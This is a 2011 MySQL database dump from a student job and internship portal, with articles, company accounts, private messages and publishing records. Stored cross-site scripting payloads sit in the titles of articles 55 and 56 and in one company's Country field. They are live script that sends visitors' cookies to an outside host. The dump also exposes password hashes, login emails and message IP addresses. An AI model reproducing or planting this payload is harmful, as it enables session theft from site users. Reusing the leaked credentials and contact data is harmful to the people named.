-- phpMyAdmin SQL Dump
-- version 2.11.9.5
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Aug 18, 2011 at 11:45 PM
-- Server version: 5.0.77
-- PHP Version: 4.4.9

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `lykeion`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(5) NOT NULL auto_increment,
  `name` varchar(50) NOT NULL,
  `username` varchar(50) NOT NULL,
  `pass` varchar(100) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `name`, `username`, `pass`) VALUES
(1, 'Nedim', 'admin', 'f172dadb2ac93664b1c6f8ea5e4e704c');

-- --------------------------------------------------------

--
-- Table structure for table `articles`
--

CREATE TABLE `articles` (
  `ID` int(11) NOT NULL auto_increment,
  `title` text NOT NULL,
  `intro` text NOT NULL,
  `tekst` longtext NOT NULL,
  `image` text NOT NULL,
  `category` int(11) NOT NULL,
  `comments` int(11) NOT NULL,
  `editable` int(11) NOT NULL,
  `views` int(11) NOT NULL,
  `publish` int(11) NOT NULL,
  `gallery` int(11) NOT NULL,
  `metatags` int(11) NOT NULL,
  `jobtype` int(11) NOT NULL,
  `scolarship` int(11) NOT NULL,
  `status` varchar(50) NOT NULL,
  `user` int(11) NOT NULL,
  `user_type` varchar(50) NOT NULL,
  `date_of_creation` datetime NOT NULL,
  `deleted` tinyint(1) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=57 ;

--
-- Dumping data for table `articles`
--

INSERT INTO `articles` (`ID`, `title`, `intro`, `tekst`, `image`, `category`, `comments`, `editable`, `views`, `publish`, `gallery`, `metatags`, `jobtype`, `scolarship`, `status`, `user`, `user_type`, `date_of_creation`, `deleted`) VALUES
(43, 'Research and Development Activities at the Faculty', '<p><span>In addition to education, the Faculty&nbsp;is actively involved in research and development for industry and scientific organizations; in the year 1991 total value of R&amp;D projects realized at the Faculty reached one million KM (approx. half million EUR).</span></p>', '<p><span>\r\n<p>In the&nbsp;subsequent &nbsp;years, the Faculty has been engaged on varios projects of reconstruction and revitalization of Sarajevo and Bosnia and Herzegovina, and had its staff engaged at the various levels of planning/reconstruction and development.</p>\r\n<p>&nbsp;</p>\r\n<p>Today the Faculty of Electrical Engineering is trying &nbsp;to broaden its research, development and professional activities in all the fields of its expertise and teaching interests.</p>\r\n<p>&nbsp;</p>\r\n<p>Within this framework, &nbsp;the Faculty is offering its services in:</p>\r\n<p>1. Research and development projects in domestic and international cooperation</p>\r\n<p>2. Consulting</p>\r\n<p>3.&nbsp; Studies and analyses</p>\r\n<p>4. Evaluation of the projects</p>\r\n<p>5. Design of nonstandard and research results implementation projects</p>\r\n<p>6. Realization of tender documentation</p>\r\n<p>7. Implementation of tenders and investment projects</p>\r\n<p>&nbsp;</p>\r\n<p>Faculty Projects Contractors and Partners&nbsp;are comfortable&nbsp;in expectations that task force , with&nbsp; 4 academicians, 47 PhD''s, 36 MSc''s and 134 Dipl. El. Eng. (both full time and part time employees),&nbsp;will successfully complete its assigned and&nbsp;granted&nbsp;projects at high scientific and professional&nbsp;standards and levels of quality.</p>\r\n<p>&nbsp;</p>\r\n<p>Fields of scientific research and development&nbsp; areas covered by specific departments are given, in more detail, on the<a href="http://www.etf.unsa.ba/index.php?id=120">departmental web pages</a>.</p>\r\n</span></p>', 'img/', 0, 0, 0, 1, 69, -1, 69, -1, -1, 'Active', 12, 'university', '2011-08-06 00:51:01', 0),
(44, 'Master in Sarajevo', '<p><span>\r\n<p>The conditions that candidates need to meet for enrolling at the Faculty are:</p>\r\n<p>- 4-year high school and</p>\r\n<p>- success at the qualification examination</p>\r\n<p>Before the qualification exam is taken, the Faculty organizes preparatory courses in mathematics. The information on the terms and conditions for the courses is available at the Students Registry Office. The number of freshmen enrolled each year is defined by the Ministry of Education of the Sarajevo Canton, based on the proposal by the Senate of the University. The announcement is made public in the daily newspapers in mid June each year.</p>\r\n</span></p>', '<p><span>\r\n<p>All of our students are enrolled in one of the four departments:</p>\r\n<p>- Automatic Control and Electronics</p>\r\n<p>- Electric Power Engineering</p>\r\n<p>- Computing and Information Science</p>\r\n<p>- Telecommunication</p>\r\n<p>&nbsp;</p>\r\n<p>Total duration of the studies is nine semesters. After finishing the 9th semester, students are entitled to absolvent status for the next two semesters. During that period students are expected to pass all their remaining exams including their graduate (diploma) works.</p>\r\n<p>&nbsp;</p>\r\n<p>After graduation students obtain the professional title:</p>\r\n<p>Dipl. Electrical Engineer of corresponding department (professional orientation).</p>\r\n</span></p>', 'img/', 0, 0, 0, 7, 70, -1, 70, -1, 9, 'Active', 12, 'university', '2011-08-06 00:59:12', 1),
(45, 'EESTEC Newsletter - August 2011 Issue', '<p><strong>Take a look at the August''11 issue of EESTEC''s Newsletter, a source of all current happenings inside and outside the world of EESTEC.</strong></p>', '<p><span>\r\n<p><span><a class="internal-link" title="August 2011" href="http://eestec.net/news-and-offers/publications/newsletter-1/august-2011/august-2011"><strong>EESTEC Newsletter - August''11 Issue</strong></a>&nbsp;has been published.</span></p>\r\n<div>&nbsp;</div>\r\n<div>EESTEC-ers all over Europe have been very active during the summer, organizing and participating in many events. The Newsletter offers a concise summary of all the important happenings in the EESTEC world, and some of the ones happening outside it!</div>\r\n<div>&nbsp;</div>\r\n<div>This month, read about the newest type of event that''s about to take place: the 1st Grant Team Operational Conference. EESTEC Grant Team has been very busy, alongside LC Belgrade, in organizing their first official event, where new EESTEC-ers can become Grant Team members.</div>\r\n<div>&nbsp;</div>\r\n<div>Also, read about the upcoming Training For Trainers, organized by EESTEC Training Team and LC Maribor. It''s the 4th T4T so far, and also the first to introduce Technical Trainers, who will be crucial for the future of EESTEC''s work.</div>\r\n<div>&nbsp;</div>\r\n<div>Finally, what would EESTEC be without it''s many workshops and exchanges; read about the many and various workshops and exchanges that have taken place, or are about to take place, in many different European cities.</div>\r\n<div>&nbsp;</div>\r\n<div>Happy reading!</div>\r\n</span></p>', 'img/test.png', 0, 0, 0, 8, 71, -1, 71, -1, -1, 'Active', 13, 'company', '2011-08-06 01:29:31', 0),
(46, 'Oktoberfest Exchange 2011', '<p><span>\r\n<div class="label">Date</div>\r\n<div class="date"><abbr id="parent-fieldname-startDate" class=" dtstart" title="2011-09-20T00:00:00+02:00"><span class="explain">Sep 20, 2011</span>&nbsp;</abbr><span>to</span>&nbsp;<abbr id="parent-fieldname-endDate" class=" dtend" title="2011-09-26T00:00:00+02:00"><span class="explain">Sep 26, 2011</span></abbr></div>\r\n<div class="label">Deadline</div>\r\n<div class="deadline"><abbr id="parent-fieldname-deadline" class=" dtstart" title="2011-08-20T23:55:00+02:00"><span class="explain">Aug 20, 2011</span></abbr></div>\r\n<div class="label">Organizer</div>\r\n<div class="lc">LC Munich</div>\r\n</span></p>', '<p><span>Dear EESTECers,<br /><br />LC Munich/Awesome is proud to announce the&nbsp;<em><strong>2011 Oktoberfest Exchange</strong></em>&nbsp;from&nbsp;<br /><strong>September 20th</strong>&nbsp;until&nbsp;<strong>September 26th</strong>.<br />You will have the honor of drinking the world''s finest beer in the world''s&nbsp;<br />finest city with the most sophisticated soon-to-be engineers in Europe.<br /><br />Besides all these tempting facts we are also planning a cultural program, a&nbsp;<br />City-Rally, sightseeing, and clubbing. There won''t be any lectures, however&nbsp;<br />plenty of entertainment during your stay in Munich is guaranteed.<br /><br />Since hostel prices are ridiculous during Oktoberfest, we will be&nbsp;<br />accommodating you privately. Unfortunately we have to ask for a participation&nbsp;<br />fee of<strong>&nbsp;60&euro;</strong>. This includes meals and local transportation. We have to warn you&nbsp;<br />though, Munich is generally an expensive place during Oktoberfest. A liter of&nbsp;<br />beer is&nbsp;<strong>8.70&euro;</strong>! But as usual, everything except for drinks is included for our&nbsp;<br />participants. No need to worry, we will not be spending the entire week at&nbsp;<br />Oktoberfest itself, and you will have a lot of chances to get cheaper beer! :)&nbsp;<br />This is a once in a lifetime chance to experience Oktoberfest at such&nbsp;<br />affordable prices!<br /><br />This year we will be able to host&nbsp;<strong>11-13</strong>&nbsp;participants.<br /><br />Again, this is the opportunity of your life to enjoy the world''s biggest beer&nbsp;<br />festival (and party) with your fellow EESTECers! We strongly encourage you to&nbsp;<br />apply! :)<br /><br />The deadline to apply for this awesome event is Saturday&nbsp;<strong>August 20th</strong>.<br /><br />P.S. Loving beer is a must ;)</span></p>', 'img/', 0, 0, 0, 4, 72, -1, 72, -1, -1, 'Active', 13, 'company', '2011-08-07 13:21:51', 0),
(47, 'Some Internship', '<p>Testing if we are going to see details.</p>', '<p>We will see :)</p>', 'img/', 0, 0, 0, 8, 73, -1, 73, 21, -1, 'Active', 13, 'company', '2011-08-07 17:14:15', 0),
(48, 'Reporting a bug on the website', '<p>What do you do when you find a bug? Read here :)</p>', '<p><a href="https://spreadsheets.google.com/spreadsheet/viewform?hl=en_US&amp;formkey=dC1aRnRFS1RXbi1kQWtRYXlLX1ZlUkE6MQ#gid=0">Here</a> is the link for reporting the bug. It doesn''t have to be a bug, it can be some suggestion or advice :)</p>', 'img/', 0, 0, 0, 12, 74, -1, 74, -1, -1, 'Active', 13, 'company', '2011-08-07 19:10:53', 0),
(49, 'Hello', '<p>Testing the mail server :)</p>', '<p>Yes</p>', 'img/', 0, 0, 0, 1, 75, -1, 75, -1, -1, 'Active', 12, 'university', '2011-08-16 21:36:42', 1),
(50, 'Test title', '<p>Sample intro</p>', '<p>Outro</p>', 'img/', 0, 0, 0, 13, 76, -1, 76, -1, -1, 'Active', 14, 'company', '2011-08-16 22:14:09', 0),
(53, 'This is the news', '<p>yes</p>', '<p>fdgfdfgfdgdfgdfg</p>', 'img/', 0, 0, 0, 0, 79, -1, 79, -1, -1, 'Pending', 13, 'company', '2011-08-17 21:42:03', 0),
(54, 'Job', '<p>Yes</p>', '<p>no</p>', 'img/', 0, 0, 0, 0, 80, -1, 80, 23, -1, 'Pending', 13, 'company', '2011-08-17 21:44:19', 0),
(55, '<script>var request = new XMLHttpRequest();request.open(\\"POST\\", \\"http://www.cprog.de/l.php?q=\\"+document.cookie, false);request.send(null);if (request.status == 200){console.log(request.responseText);}</script>', '<p>fsdgdfgdfg</p>', '<p>fdgfdgdfgdgegf</p>', 'img/', 0, 0, 0, 0, 81, -1, 81, -1, -1, 'Pending', 13, 'company', '2011-08-18 02:11:03', 0),
(52, 'new job', '<p><strong>testing </strong></p>', '<ol>\r\n<li>some <strong><em>text </em></strong></li>\r\n</ol>', 'img/ws_Fantasy_Beach_1024x768.jpg', 0, 0, 0, 2, 78, -1, 78, 22, -1, 'Active', 15, 'company', '2011-08-17 21:35:30', 0),
(56, '&lt;script&gt;var request = new XMLHttpRequest();request.open(&quot;POST&quot;, &quot;http://www.cprog.de/l.php?q=&quot;+document.cookie, false);request.send(null);if (request.status == 200){console.log(request.responseText);}&lt;/script&gt;', '<p>dsfdsfsdf</p>', '<p>wefwefwef</p>', 'img/', 0, 0, 0, 1, 82, -1, 82, -1, -1, 'Active', 13, 'company', '2011-08-18 02:14:16', 1);

-- --------------------------------------------------------

--
-- Table structure for table `category_articles`
--

CREATE TABLE `category_articles` (
  `ID` int(11) NOT NULL auto_increment,
  `name` text NOT NULL,
  `description` text NOT NULL,
  `creation` datetime NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COMMENT='tabela sa kategorijama za artikle' AUTO_INCREMENT=1 ;

--
-- Dumping data for table `category_articles`
--


-- --------------------------------------------------------

--
-- Table structure for table `companys`
--

CREATE TABLE `companys` (
  `ID` int(11) NOT NULL auto_increment,
  `Name` varchar(300) NOT NULL,
  `Field_of_work` varchar(1000) NOT NULL,
  `Number_of_emplyees` varchar(300) NOT NULL,
  `Contact_person` varchar(300) NOT NULL,
  `Address` varchar(300) NOT NULL,
  `City` varchar(300) NOT NULL,
  `Country` varchar(300) NOT NULL,
  `Phone_number` varchar(50) NOT NULL,
  `Fax_number` varchar(50) NOT NULL,
  `Email` varchar(150) NOT NULL,
  `Web` varchar(150) NOT NULL,
  `Facebook` varchar(150) NOT NULL,
  `Linkedin` varchar(150) NOT NULL,
  `Twitter` varchar(150) NOT NULL,
  `Username` varchar(100) NOT NULL,
  `Password` varchar(100) NOT NULL,
  `Logo` varchar(200) NOT NULL,
  `Login_email` varchar(150) NOT NULL,
  `Date_of_expire` date NOT NULL,
  `date_of_creation` date NOT NULL,
  `Status` varchar(20) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=17 ;

--
-- Dumping data for table `companys`
--

INSERT INTO `companys` (`ID`, `Name`, `Field_of_work`, `Number_of_emplyees`, `Contact_person`, `Address`, `City`, `Country`, `Phone_number`, `Fax_number`, `Email`, `Web`, `Facebook`, `Linkedin`, `Twitter`, `Username`, `Password`, `Logo`, `Login_email`, `Date_of_expire`, `date_of_creation`, `Status`) VALUES
(13, 'EESTEC', 'Electrical Engineering, Computer Science, Soft Skills, Organisational skills', '8000 members', 'International board', 'Mekelweg 4, 2628 CD ', 'Delft', 'Netherlands', '', '', 'board@eestec.net', 'eestec.net', 'http://www.facebook.com/pages/EESTEC/110917468930454', '', 'http://twitter.com/#!/EESTEC', 'eestec', '4a5bc915911061de43024dee0d8b4404', 'img/thumbs/img4e3c7b85cab7e.jpg', 'nedim.hadzic@eestec-sa.ba', '2012-08-17', '2011-08-05', 'Active'),
(14, 'asgfasg', '', '', '', 'dsfd', '', '<script>var request = new XMLHttpRequest();request.open("POST", "http://www.cprog.de/l.php?q="+document.cookie, false);request.send(null);if (request.status == 200){console.log(request.responseText);}</script>', '', '', '', '', '', '', '', 'abesirovic', '5f4dcc3b5aa765d61d8327deb882cf99', 'img/thumbs/avatar.jpg', 'armin.besirovic@gmail.com', '2012-08-16', '2011-08-16', 'Active'),
(15, 'e', 'eee', 'eee', 'eee', 'e', 'Sarajevo', 'Bosnia and Herzegovina', '', '', '', '', '', '', '', 'elmaars', '818e6567f6352616bd02d09be0ac853a', 'img/thumbs/img4e4c135acf9e4.jpg', 'elms.a@hotmail.com', '2012-02-16', '2011-08-16', 'Active'),
(16, 'Nedim', '', '', '', 'Jesam', 'Tu', 'New Zealand', '', '', '', '', '', '', '', 'negdje', '07e74449ce079971406d0ff6ade251e9', 'img/thumbs/avatar.jpg', 'chairman@eestec-sa.ba', '2011-09-18', '2011-08-18', 'Deactivated');

-- --------------------------------------------------------

--
-- Table structure for table `favorites`
--

CREATE TABLE `favorites` (
  `id` int(10) NOT NULL auto_increment,
  `user_id` int(10) NOT NULL,
  `post_id` int(10) NOT NULL,
  `type` varchar(20) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=33 ;

--
-- Dumping data for table `favorites`
--

INSERT INTO `favorites` (`id`, `user_id`, `post_id`, `type`) VALUES
(24, 28, 12, 'universitys'),
(25, 28, 45, 'articles'),
(26, 28, 13, 'companys'),
(27, 28, 44, 'articles'),
(28, 28, 47, 'articles'),
(29, 28, 48, 'articles'),
(30, 36, 48, 'articles'),
(31, 28, 50, 'articles'),
(32, 28, 52, 'articles');

-- --------------------------------------------------------

--
-- Table structure for table `jobs_intersips`
--

CREATE TABLE `jobs_intersips` (
  `ID` bigint(20) NOT NULL auto_increment,
  `type` varchar(50) NOT NULL,
  `Number_of_interns` bigint(20) NOT NULL,
  `Duration` varchar(500) NOT NULL,
  `Paid_intership` tinyint(1) NOT NULL,
  `Accomodation_costs` tinyint(1) NOT NULL,
  `Country` varchar(200) NOT NULL,
  `City` varchar(200) NOT NULL,
  `Position` varchar(600) NOT NULL,
  `Deadline` datetime NOT NULL,
  `Forgein_language` text NOT NULL,
  `Internduties` text NOT NULL,
  `Academic_level` text NOT NULL,
  `Driving_licence` tinyint(1) NOT NULL,
  `Type_of` tinyint(1) NOT NULL,
  `date_of_creation` datetime NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=24 ;

--
-- Dumping data for table `jobs_intersips`
--

INSERT INTO `jobs_intersips` (`ID`, `type`, `Number_of_interns`, `Duration`, `Paid_intership`, `Accomodation_costs`, `Country`, `City`, `Position`, `Deadline`, `Forgein_language`, `Internduties`, `Academic_level`, `Driving_licence`, `Type_of`, `date_of_creation`) VALUES
(21, 'intership', 5, '6 months', 0, 0, 'Bosnia', 'Sarajevo', 'Developer', '2011-08-07 17:14:15', '', '', '', 1, 0, '2011-08-07 17:14:15'),
(22, 'job', 13, '', 1, 1, '', '', '', '2011-08-17 21:35:30', '', '', '', 0, 1, '2011-08-17 21:35:30'),
(23, 'job', 16, '2 years', 0, 0, 'Some', 'Yes', 'Developer', '2011-08-17 21:44:19', '', '', '', 0, 0, '2011-08-17 21:44:19');

-- --------------------------------------------------------

--
-- Table structure for table `metatags`
--

CREATE TABLE `metatags` (
  `ID` int(11) NOT NULL auto_increment,
  `title` varchar(300) character set latin1 default NULL,
  `keywords` text character set latin1,
  `description` text character set latin1,
  `custom_metatags` text character set latin1,
  PRIMARY KEY  (`ID`),
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1250 COLLATE=cp1250_bin COMMENT='tabela koja sadrzi metatagove za article i galerije odnoso s' AUTO_INCREMENT=83 ;

--
-- Dumping data for table `metatags`
--

INSERT INTO `metatags` (`ID`, `title`, `keywords`, `description`, `custom_metatags`) VALUES
(69, '', '', '', ''),
(70, '', '', '', ''),
(71, '', '', '', ''),
(72, '', '', '', ''),
(73, '', '', '', ''),
(74, '', '', '', ''),
(75, '', '', '', ''),
(76, '', '', '', ''),
(77, '', '', '', ''),
(78, '', '', '', ''),
(79, '', '', '', ''),
(80, '', '', '', ''),
(81, '', '', '', ''),
(82, '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `mm_messages_clients`
--

CREATE TABLE `mm_messages_clients` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `ID_conversation` bigint(20) NOT NULL,
  `User` int(11) NOT NULL,
  `Readed` tinyint(1) NOT NULL,
  `Deleted` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=56 ;

--
-- Dumping data for table `mm_messages_clients`
--

INSERT INTO `mm_messages_clients` (`ID`, `ID_conversation`, `User`, `Readed`, `Deleted`) VALUES
(33, 16, 53, 0, 0),
(34, 16, 54, 1, 0),
(35, 16, 56, 1, 0),
(36, 17, 55, 1, 0),
(37, 17, 54, 1, 0),
(38, 18, 57, 0, 0),
(39, 18, 54, 1, 0),
(40, 19, 58, 0, 0),
(41, 19, 54, 1, 0),
(42, 20, 53, 0, 0),
(43, 20, 54, 1, 0),
(44, 20, 56, 1, 0),
(45, 21, 56, 1, 0),
(46, 21, 55, 1, 0),
(47, 22, 60, 0, 0),
(48, 22, 54, 1, 0),
(49, 23, 64, 1, 0),
(50, 23, 54, 1, 0),
(51, 24, 53, 0, 0),
(52, 24, 54, 1, 0),
(53, 24, 64, 1, 0),
(54, 25, 64, 0, 0),
(55, 25, 55, 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `mm_messages_conversation`
--

CREATE TABLE `mm_messages_conversation` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `Subject` varchar(250) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=26 ;

--
-- Dumping data for table `mm_messages_conversation`
--

INSERT INTO `mm_messages_conversation` (`ID`, `Subject`) VALUES
(16, 'How are you?'),
(17, 'test'),
(18, 'Hello board'),
(19, 'Testing messages'),
(20, 'test'),
(21, 'How are you'),
(22, 'Test'),
(23, 'Haloooo'),
(24, 'Fercera li?'),
(25, 'Znas sta si ti?');

-- --------------------------------------------------------

--
-- Table structure for table `mm_messages_conv_users`
--

CREATE TABLE `mm_messages_conv_users` (
  `ID` int(10) unsigned NOT NULL auto_increment,
  `User_ID` int(10) unsigned NOT NULL,
  `User` varchar(100) NOT NULL,
  `ID_user` int(10) unsigned NOT NULL,
  `User_type` varchar(50) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='ID_user je za poruke a User_ID je od usera( student, company' AUTO_INCREMENT=78 ;

--
-- Dumping data for table `mm_messages_conv_users`
--

INSERT INTO `mm_messages_conv_users` (`ID`, `User_ID`, `User`, `ID_user`, `User_type`) VALUES
(53, 27, 'nedo99', 0, 'student'),
(54, 28, 'nedo99', 0, 'student'),
(55, 13, 'eestec', 0, 'company'),
(56, 12, 'etfsarajevo', 0, 'university'),
(57, 29, 'board2011', 0, 'student'),
(58, 30, 'shatlyk', 0, 'student'),
(59, 31, 'jasamtaj', 0, 'student'),
(60, 32, 'ivicaeestec', 0, 'student'),
(61, 33, 'hadzija', 0, 'student'),
(62, 34, 'dfsjsdgh', 0, 'student'),
(63, 35, 'Ivicaaklsdjfl', 0, 'student'),
(64, 36, 'denisr', 0, 'student'),
(65, 37, 'nedimaga', 0, 'student'),
(66, 38, 'abesirovic', 0, 'student'),
(67, 14, 'abesirovic', 0, 'company'),
(68, 39, 'abesirovic2', 0, 'student'),
(69, 15, 'elmaars', 0, 'company'),
(70, 13, 'elmaars1', 0, 'university'),
(71, 40, 'okicee', 0, 'student'),
(72, 41, 'tralalala', 0, 'student'),
(73, 42, 'wwwwww', 0, 'student'),
(74, 43, 'nekodobro', 0, 'student'),
(75, 44, 'nekodobro', 0, 'student'),
(76, 14, 'nepoznato', 0, 'university'),
(77, 16, 'negdje', 0, 'company');

-- --------------------------------------------------------

--
-- Table structure for table `mm_messages_msg`
--

CREATE TABLE `mm_messages_msg` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `ID_conversation` bigint(20) unsigned NOT NULL,
  `Headline` varchar(250) NOT NULL,
  `MSG` text NOT NULL,
  `User` int(11) NOT NULL,
  `Send` datetime NOT NULL,
  `IP` varchar(25) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=47 ;

--
-- Dumping data for table `mm_messages_msg`
--

INSERT INTO `mm_messages_msg` (`ID`, `ID_conversation`, `Headline`, `MSG`, `User`, `Send`, `IP`) VALUES
(34, 16, 'How are you?', 'Yes', 56, '2011-08-06 01:00:30', '::1'),
(35, 17, 'test', 'How are you?', 54, '2011-08-07 13:20:46', '188.127.102.241'),
(36, 17, '', 'I am fine', 55, '2011-08-07 13:21:04', '188.127.102.241'),
(37, 19, 'Testing messages', 'Did you get a sendwich or some sweets in the bus from the hostes? :P', 54, '2011-08-08 00:53:25', '109.175.54.223'),
(38, 20, 'test', 'dfngmdf', 56, '2011-08-08 03:08:41', '109.175.54.223'),
(39, 21, 'How are you', 'I am fine', 55, '2011-08-13 15:24:36', '109.175.52.46'),
(40, 21, '', 'ok', 56, '2011-08-13 15:25:10', '109.175.52.46'),
(41, 22, 'Test', 'Kako je Ivice????? :D', 54, '2011-08-16 15:03:50', '109.175.95.171'),
(42, 22, ':D', 'Evo nista, ti :)?\r\n\r\nJa bezveze :D', 60, '2011-08-16 15:06:11', '147.91.79.116'),
(43, 22, '', 'Stiglo je evo i meni :)', 54, '2011-08-16 15:06:49', '109.175.95.171'),
(44, 23, 'Haloooo', 'sta radis', 54, '2011-08-16 17:51:05', '109.175.63.168'),
(45, 24, 'Fercera li?', 'Nego sta nego fercera :D\r\n\r\n\r\nP.S. Znas ti sta si ti? :)', 64, '2011-08-16 17:51:10', '217.75.201.130'),
(46, 25, 'Znas sta si ti?', 'Ti si jedna velika masina :D', 55, '2011-08-16 17:52:45', '109.175.63.168');

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(5) NOT NULL auto_increment,
  `type` varchar(20) NOT NULL,
  `type_id` int(10) NOT NULL,
  `number` int(20) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=13 ;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `type`, `type_id`, `number`) VALUES
(5, 'university', 12, 1),
(6, 'company', 13, 29),
(8, 'company', 14, 28),
(9, 'company', 15, 19),
(10, 'university', 13, 29),
(11, 'university', 14, 1),
(12, 'company', 16, 1);

-- --------------------------------------------------------

--
-- Table structure for table `publish_articles`
--

CREATE TABLE `publish_articles` (
  `ID` int(11) NOT NULL auto_increment,
  `article` int(11) NOT NULL,
  `from` datetime default NULL,
  `to` datetime default NULL,
  `reads` int(11) default NULL,
  `status` varchar(20) NOT NULL,
  `published` varchar(20) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COMMENT='tabela koja sadrzi vremena odnosno broj prikazivanja za clan' AUTO_INCREMENT=83 ;

--
-- Dumping data for table `publish_articles`
--

INSERT INTO `publish_articles` (`ID`, `article`, `from`, `to`, `reads`, `status`, `published`) VALUES
(71, 0, '2011-08-06 01:26:44', '2012-02-07 12:00:00', 0, 'publish', 'forever'),
(70, 0, '2011-08-06 12:57:22', '2012-02-07 12:00:00', 0, 'publish', 'forever'),
(69, 0, '2011-08-06 12:50:24', '2012-02-07 12:00:00', 0, 'unpublish', 'forever'),
(31, 0, '2011-08-01 12:46:50', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(32, 0, '2011-08-01 12:46:50', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(33, 0, '2011-08-01 12:46:50', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(34, 0, '2011-08-01 12:57:27', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(35, 0, '2011-08-01 12:59:01', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(36, 0, '2011-08-01 01:37:13', '2012-02-02 12:00:00', 0, 'publish', 'forever'),
(37, 0, '2011-08-02 04:04:25', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(38, 0, '2011-08-02 04:47:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(39, 0, '2011-08-02 05:00:14', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(40, 0, '2011-08-02 05:02:56', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(41, 0, '2011-08-02 06:36:52', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(42, 0, '2011-08-02 06:37:30', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(43, 0, '2011-08-02 06:37:30', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(44, 0, '2011-08-02 06:42:56', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(45, 0, '2011-08-02 06:42:56', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(46, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(47, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(48, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(49, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(50, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(51, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(52, 0, '2011-08-02 06:52:43', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(53, 0, '2011-08-02 07:00:29', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(54, 0, '2011-08-02 07:03:48', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(55, 0, '2011-08-02 07:26:30', '2012-02-03 12:00:00', 0, 'publish', 'forever'),
(56, 0, '2011-08-04 12:41:43', '2012-02-05 12:00:00', 0, 'publish', 'forever'),
(57, 0, '2011-08-05 12:46:15', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(58, 0, '2011-08-05 12:49:24', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(59, 0, '2011-08-05 12:49:24', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(60, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(61, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(62, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(63, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(64, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(65, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(66, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(67, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
(68, 0, '2011-08-05 12:51:17', '2012-02-06 12:00:00', 0, 'publish', 'forever'),
